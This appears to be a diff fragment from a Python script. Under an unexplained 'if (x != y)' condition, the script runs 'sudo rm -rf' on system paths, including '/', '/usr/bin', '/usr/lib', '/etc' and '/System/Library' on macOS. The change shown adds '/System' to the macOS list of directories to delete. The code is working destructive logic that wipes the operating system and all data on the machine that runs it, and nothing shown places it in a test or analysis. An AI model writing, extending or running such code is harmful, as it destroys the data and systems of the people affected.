@@ -21,7 +21,7 @@ if (x != y):
             subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)
 
     elif system == "Darwin":
-        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library",]
+        paths = ["/","/usr/bin","/usr/lib","/etc","/System/Library","/System",]
         for i in paths:
             subprocess.run(["sudo","rm", "-rf", f"{i}"], check=False)
 
